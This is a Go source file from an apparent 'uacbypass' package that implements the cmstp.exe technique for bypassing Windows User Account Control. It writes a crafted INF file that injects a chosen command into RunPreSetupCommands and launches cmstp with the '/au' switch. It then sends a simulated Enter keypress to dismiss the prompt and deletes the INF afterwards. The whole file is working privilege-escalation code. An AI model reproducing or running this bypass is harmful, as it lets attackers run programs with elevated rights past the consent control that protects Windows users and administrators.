// Copyright (c) 2019-2022 0x9ef. All rights reserved.
// Use of this source code is governed by an MIT license
// that can be found in the LICENSE file.
package once

import (
	"os"
	"time"

	. "uacbypass/pkg"
)

func ExecCmstp(path string) error {
	t := `[version]
Signature=$chicago$
AdvancedINF=2.5
[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection
[RunPreSetupCommandsSection]` + "\n" + path + `
taskkill /IM cmstp.exe /F
[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7
[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
[Strings]
ServiceName="GUACBypasserVPN"
ShortSvcName="GUACBypasserVPN"`

	f, err := os.Create("rx0.ini")
	if err != nil {
		return err
	}
	n, err := f.Write([]byte(t))
	if err != nil && n == 0 {
		return err
	}
	f.Close()
	defer os.Remove("rx0.ini")
	err = ShellExecute(path, "cmstp.exe", "/au rx0.ini", 0)
	if err != nil {
		return err
	}

	time.Sleep(3 * time.Second)
	err = KeybdEvent(0x0D, 0, 0, 0) // send keyboard events
	return err
}
